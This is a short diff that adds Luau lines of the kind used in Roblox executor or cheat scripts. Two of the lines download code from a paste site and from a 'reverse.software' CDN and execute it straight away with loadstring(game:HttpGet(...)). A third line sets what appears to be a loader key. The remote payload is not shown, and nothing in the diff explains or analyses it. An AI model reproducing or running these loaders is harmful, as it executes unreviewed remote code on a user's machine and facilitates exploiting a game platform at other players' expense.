@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastefy.app/mKXd2vTD/raw",true))()
+ID="281b4cca-f00e-4f9d-985c-32df2a0b73b5";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
